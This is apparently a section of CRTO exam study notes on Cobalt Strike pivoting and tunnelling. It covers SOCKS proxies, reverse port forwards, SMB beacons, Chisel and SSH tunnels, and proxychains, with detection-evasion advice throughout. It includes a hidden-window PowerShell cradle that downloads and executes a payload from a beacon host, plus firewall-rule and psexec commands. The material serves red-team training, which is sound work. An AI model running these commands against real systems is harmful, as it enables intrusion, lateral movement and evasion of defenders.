## 10. Pivoting and tunnelling

Pivoting lets you reach hosts that your attack box cannot. The quietest pivot is one that uses an existing beacon's network position and does not open a new listening port.

### 10.1 Concepts

| Term | Meaning | Exam use |
|---|---|---|
| **Egress beacon** | The only beacon that talks to the internet | One per network; keep it quiet |
| **Peer-to-peer beacon** | SMB/TCP beacon connected through another beacon | Internal movement without new egress |
| **SOCKS proxy** | Routes arbitrary TCP through a beacon | Operator tools (proxychains, browser, Impacket) |
| **Reverse port forward** | Listens on the target network and forwards to your box | Bring a tool or listener into the target network |
| **Bind session** | The target listens; you connect | Through a SOCKS proxy |

**Design rule:** put the loudest traffic through the quietest channel. A SOCKS proxy over an SMB beacon that hangs off a slow egress beacon is far safer than every host calling home.

### 10.2 SOCKS proxy

```text
# Start a SOCKS proxy on the beacon (operator side listens locally)
socks 1080 socks5
socks 1080 socks5 disableNoAuth <user> <pass> enableLogging

# SOCKS4 (avoid — no auth, no UDP, weaker OPSEC)
socks 1080 socks4

# Stop
socks stop
```

**OPSEC:** prefer **SOCKS5** (public CRTO guidance explicitly recommends it). `enableLogging` helps you debug but generates local logs; decide whether you want them. The proxy itself does not generate target-side traffic beyond the beacon's normal check-ins.

### 10.3 Reverse port forward

Use when you need a target-network host to reach a service on your attack box or on the beacon host.

```text
# Forward target-network port 8080 → 127.0.0.1:80 (relative to the beacon host)
rportfwd 8080 127.0.0.1 80

# Local variant (⚠ version dependent)
rportfwd_local 8080 127.0.0.1 80

# List / stop
job
rportfwd stop 8080
```

**Typical use:** host a payload on your attack box, then have the target download it through the beacon host:

```text
# On the beacon host, allow the inbound port if the firewall blocks it
powerpick New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# On the target
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<beacon-host>:8080/payload'))"
```

**OPSEC:** `rportfwd` opens a **listener** on the beacon host (WFP 5156/5157). Adding a firewall rule is itself an artifact (and may be scored). Prefer a port the host already allows, or use an existing service.

### 10.4 SMB and TCP beacons (peer-to-peer)

```text
# On the parent beacon, create an SMB listener with a non-default pipe name first (in the GUI)
link <target-fqdn> <pipe-name>
connect <target> <port>          # TCP bind beacon
unlink                           # disconnect a child

# Verify the child
beacon> getuid
```

**OPSEC:**
- Change the **pipe name** from the default; default pipe names are heavily signatured.
- SMB beacon traffic is internal; it does not create internet egress, which is a big OPSEC win.
- Named-pipe creation/connection is Sysmon 17/18. A non-default pipe is less obvious but still visible.
- Do not link dozens of hosts to one parent; blast radius and lineage matter.

### 10.5 Other tunnels

```text
# Chisel (if available) — reverse SOCKS through an HTTP tunnel
# Operator:
chisel.exe server --reverse --port 8080
# Target:
chisel.exe client <operator-ip>:8080 R:socks

# SSH local/remote/dynamic forwarding
ssh -D 1080 <user>@<host>
ssh -L 8080:<target>:80 <user>@<host>
ssh -R 8080:localhost:80 <user>@<host>
```

**OPSEC:** every tunnel is a listening port or a long-lived connection. Prefer tunnels that reuse allowed ports (443) and remove them when done.

### 10.6 Using the proxy

```bash
# proxychains
cat /etc/proxychains4.conf
# [ProxyList]
# socks5 127.0.0.1 1080
proxychains4 nxc smb <target> -u <user> -p <pass>
proxychains4 impacket-psexec <domain>/<user>:<pass>@<target>
```

```text
# Windows: Proxifier profile pointing at 127.0.0.1:1080 (SOCKS5)
```

**Kerberos through a proxy:** tools that use Kerberos need the **FQDN** and correct DNS resolution. Point DNS at the DC or use the target's hostname in the tool. IP-based Kerberos requests fail with SPN errors.

### 10.7 Pivoting checklist

- [ ] One quiet egress beacon, long sleep/jitter
- [ ] Internal sessions are SMB/TCP peer-to-peer where possible
- [ ] SOCKS5, not SOCKS4
- [ ] Non-default SMB pipe names
- [ ] No unnecessary firewall rules; remove any you add
- [ ] `jobkill` proxies/scans when done
- [ ] `rportfwd stop`, `unlink`, and close tunnels
- [ ] Verify FQDN/DNS for Kerberos

### 10.8 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `link` fails | Wrong pipe, SMB blocked, target not admin | Check pipe name; `net view`; admin rights |
| SOCKS works but tools fail | Tool ignores proxy / DNS | Use proxychains correctly; resolve FQDN |
| `rportfwd` unreachable | Firewall on beacon host | Check `netstat`; add a rule only if necessary |
| `connect` fails | Bind beacon not listening / port blocked | Verify listener and port |
| Kerberos fails through SOCKS | IP instead of FQDN, or DNS | Use FQDN; set DNS to the DC |
| Tunnel drops | Beacon sleep too long / host rebooted | Shorten sleep for active work; re-establish |

